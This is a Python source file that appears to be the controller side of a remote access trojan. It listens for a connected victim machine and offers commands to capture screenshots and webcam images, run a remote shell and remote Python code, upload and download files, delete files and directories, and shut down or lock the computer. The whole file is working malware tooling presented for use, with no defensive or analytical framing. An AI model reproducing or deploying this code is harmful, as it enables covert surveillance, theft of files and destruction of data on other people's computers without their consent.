import socket, os, time

# Socket Properties
HOST = "0.0.0.0"
PORT = 3000

# Defines (Send & Recv) Functions for use
send = lambda data: conn.send(data)
recv = lambda buffer: conn.recv(buffer)
bufsize = 1024
delay = 0.2

os.system("clear" if os.name == "posix" else "cls")

def main():
    global conn, ClientInfo

    try:
        objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except (socket.error, Exception) as e:
        print(f"[1] Error: ({e})"); exit(1)

    try:
        print(f"Listening on Port: ({PORT})\n" + "-"*25)
        objSocket.bind((HOST, PORT)); objSocket.listen(socket.SOMAXCONN)
    except (socket.error, Exception) as e2:
        print(f"[2] Error: ({e2})"); exit(1)

    while (True):
        try:
            conn, address = objSocket.accept()
            ClientInfo = recv(bufsize).decode().split()

            print(f"Computer Connected: ({ClientInfo[0]}) ({ClientInfo[1]})\n")
            return

        except (socket.error, Exception) as e3:
            print(f"[3] Error: ({e3})"); exit(1)

def recvall(buffer):
    data = b""
    while (len(data) < buffer):
        data += recv(buffer)
    return data

def UsableCommands():
    print("_______________________________________")
    print("(Connection Commands)                  |\n" + \
          "                                       |")
    print("[-tc] Terminate Connection             |")
    print("[-ac] Append Connection to Background  |")
    print("_______________________________________|")
    print("(User Interface Commands)              |\n" + \
          "                                       |")
    print("[-sm] Send Message (VBS-Box)           |")
    print("[-ow] Open Webpage                     |")
    print("[-ss] Capture Screenshot               |")
    print("[-cw] Capture Webcam                   |")
    print("_______________________________________|")
    print("(System Commands)                      |\n" + \
          "                                       |")
    print("[-si] View System Information          |")
    print("[-sp] Start Process on Remote Machine  |")
    print("[-pi] Remote Python Interpreter        |")
    print("[-rs] Remote CMD Shell                 |")
    print("[-sc] Shutdown Computer                |")
    print("[-rc] Restart Computer                 |")
    print("[-lc] Lock Computer                    |")
    print("_______________________________________|")
    print("(File Commands)                        |\n" + \
          "                                       |")
    print("[-cd] Get Current Directory            |")
    print("[-vf] View Files                       |")
    print("[-sf] Send File                        |")
    print("[-rf] Receive File                     |")
    print("[-dl] Delete File/Directory            |")
    print("_______________________________________|\n")

def OpenWebpage():
    url = input("\nWebpage URL: ")
    if not (url.startswith("http://") or url.startswith("https://")):
        print("(Bad URL, use: http/https)\n")
        return

    send(b"open-webpage"); time.sleep(delay); send(url.encode())
    print(recv(bufsize).decode() + "\n")

def Screenshot(current_time):
    send(b"capture-screenshot")

    if not (recv(bufsize).decode() == "success"):
        print("(Error Capturing Screen)\n")
        return

    buffersize = recv(bufsize).decode()
    with open(f"screenshot{current_time}.png", "wb") as ImageFile:
        ImageFile.write(recvall(int(buffersize)))

    print("\n[+] Screenshot Captured\n" + f"Total Size: ({str(buffersize)} Bytes)\n")

def Webcam(current_time):
    send(b"capture-webcam")

    if not (recv(bufsize).decode() == "success"):
        print("(No Webcam Detected)\n")
        return

    buffersize = recv(bufsize).decode(); Webcam_Name = recv(bufsize).decode()
    with open(f"webcam{current_time}.png", "wb") as ImageFile:
        ImageFile.write(recvall(int(buffersize)))

    print("\n[+] Webcam Captured\n" + f"Camera Name: ({Webcam_Name})\n" + f"Total Size: ({str(buffersize)} Bytes)\n")

def SystemInformation():
    print(f"\nComputer: ({ClientInfo[1]})")
    print(f"Username: ({ClientInfo[2]})")
    print(f"IP Address: ({ClientInfo[0]})")
    print(f"System: ({ClientInfo[3]} {ClientInfo[4]})")
    print(f"Public IP: ({ClientInfo[5]})\n")

def StartProcess():
    FileLocation = input("\nRemote File Location: "); send(b"start-process"); time.sleep(delay); send(FileLocation.encode()); ClientResponse = recv(bufsize).decode()
    if not (ClientResponse == "VALID"):
        print("(Cannot Find Remote File)\n")
        return

    print(f"Status: (Process Running)\n")

def PythonInterpreter():
    send(b"python-interpreter")

    with open("code.txt", "w") as CodeFile:
        CodeFile.close()

    if (os.name == "posix"):
        os.system("xdg-open " + "code.txt")
    else:
        os.system("start " + "code.txt")

    UserOption = input("\nExecute Code on Remote Machine? (y/n): ").lower()
    if not (UserOption == "y"):
        send(b"not-sending"); print("Returning...\n"); os.remove("code.txt")
        return

    with open("code.txt", "rb") as SendCodeFile:
        send(SendCodeFile.read())

    ClientResponse = recv(bufsize).decode()
    if not (ClientResponse == "SUCCESS"):
        print(ClientResponse + "\n"); os.remove("code.txt")
        return

    ClientOutput = recv(bufsize).decode(); SplitOutput = ClientOutput.split("<")
    if (SplitOutput[0] == ""):
        print("\n[Remote Machine Output]\n" + "-"*23 + "\n<No Output>\n")
    else:
        print("\n[Remote Machine Output]\n" + "-"*23 + f"\n{SplitOutput[0]}")

    os.remove("code.txt")

def RemoteCMD():
    send(b"remote-cmd")

    CurrentRemoteDirectory = recv(bufsize).decode()
    print("(Remote CMD Active)\n\n", end="")

    while (True):
        CMD_Command = input("[ " + CurrentRemoteDirectory + " ]> ").lower()
        if (CMD_Command == "exit" or CMD_Command == "quit"):
            send(b"close-cmd"); print("(Exited CMD)\n")
            break

        elif (CMD_Command == "cls" or CMD_Command == "clear"):
            os.system("clear" if os.name == "posix" else "cls")

        elif (CMD_Command == "cmd"):
            print("Currently in CMD\n\n", end="")

        elif (len(CMD_Command) > 0):
            send(CMD_Command.encode())
            print(recv(bufsize).decode(), end="")
        else:
            print(CurrentRemoteDirectory, end="")

def ViewFiles():
    send(b"view-files")

    print(f"Available Drives: ({recv(bufsize).decode()})\n")
    RemoteDirectory = input("Remote Directory: "); send(RemoteDirectory.encode()); ClientResponse = recv(bufsize).decode()
    if not (ClientResponse == "VALID"):
        print("(Remote Directory Not Found)\n")
        return

    Number_Of_Files = recv(bufsize).decode()
    buffersize = int(recv(bufsize).decode())
    files = recvall(buffersize).decode()

    print(f"\nFiles: [{Number_Of_Files}]\nCharacter Count: [{buffersize}]\n\n{files}\n")

def SendFile():
    FilePath = input("\nEnter File Path: ")
    if not (os.path.isfile(FilePath)):
        print("(File Not Found)\n"); return

    send(b"send-file"); time.sleep(delay); send(os.path.basename(FilePath).encode()); time.sleep(delay); send(str(os.path.getsize(FilePath)).encode())
    with open(FilePath, "rb") as file:
        send(file.read())

    print(recv(bufsize).decode() + "\n")

def ReceiveFile():
    RemotePath = input("\nRemote File Path: "); send(RemotePath.encode()); ClientResponse = recv(bufsize).decode()
    if not (ClientResponse == "success"):
        print("(Remote File Not Found)\n")
        return

    filename = recv(bufsize).decode(); buffersize = int(recv(bufsize).decode())
    with open(filename, "wb") as file:
        file.write(recvall(buffersize))

    print(f"\n[+] File Received\nFile Name: [{filename}]\nTotal Size: [{buffersize} Bytes]\n")

def Delete():
    send(b"delete")

    choice = input("\nDelete File/Directory? (f/d): ").lower()
    if (choice == "f"):
        send(b"del-file"); file = input("Remote File Path: "); send(file.encode()); ClientResponse = recv(bufsize).decode()
        if not (ClientResponse == "success"):
            print("(Remote File Not Found)\n")
            return

        print("(Remote File Deleted)\n")

    elif (choice == "d"):
        send(b"del-dir"); directory = input("Remote Directory: "); input("\n[Press Enter to Delete]"); send(directory.encode()); ClientResponse = recv(bufsize).decode()
        if not (ClientResponse == "success"):
            print("(Remote Directory Not Found)\n")
            return

        print("(Remote Directory Deleted)\n")

    else:
        send(b"error"); print("Invalid Choice, Returning...\n")

def RemoteCommands():
    while (True):
        try:
            command = input(f"({ClientInfo[0]})> ").lower().strip()
            if (command == "help" or command == "?"):
                UsableCommands()

            elif (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")

            elif (command == "-tc"):
                send(b"close-connection"); print(f"(Terminated Connection)\n"); conn.close(); break

            elif (command == "-ac"):
                send(b"append-connection"); print(f"(Appended Connection)\n"); conn.close(); break

            elif (command == "-sm"):
                message = input("\nType Message: "); send(b"message-box"); time.sleep(delay); send(message.encode()); print(recv(bufsize).decode() + "\n")

            elif (command == "-ow"):
                OpenWebpage()

            elif (command == "-ss"):
                Screenshot("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))

            elif (command == "-cw"):
                Webcam("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))

            elif (command == "-si"):
                SystemInformation()

            elif (command == "-sp"):
                StartProcess()

            elif (command == "-pi"):
                PythonInterpreter()

            elif (command == "-rs"):
                RemoteCMD()

            elif (command == "-sc"):
                send(b"shutdown-pc"); print(f"Status: ({recv(bufsize).decode()})\n")

            elif (command == "-rc"):
                send(b"restart-pc"); print(f"Status: ({recv(bufsize).decode()})\n")

            elif (command == "-lc"):
                send(b"lock-pc"); print(f"Status: ({recv(bufsize).decode()})\n")

            elif (command == "-cd"):
                send(b"current-dir"); print(recv(bufsize).decode() + "\n")

            elif (command == "-vf"):
                ViewFiles()

            elif (command == "-sf"):
                SendFile()

            elif (command == "-rf"):
                send(b"receive-file"); ReceiveFile()

            elif (command == "-dl"):
                Delete()
            else:
                print(f"Unrecognized Command: ({command})\n")

        except KeyboardInterrupt:
            send(b"append-connection"); print("\n(Keyboard Interrupted, Connection Appended)\n"); exit(0)

        except (socket.error, Exception) as e:
            print(f"\n[-] Lost Connection to ({ClientInfo[0]})\n" + f"Error Message: {e}\n"); exit(1)

main(); RemoteCommands()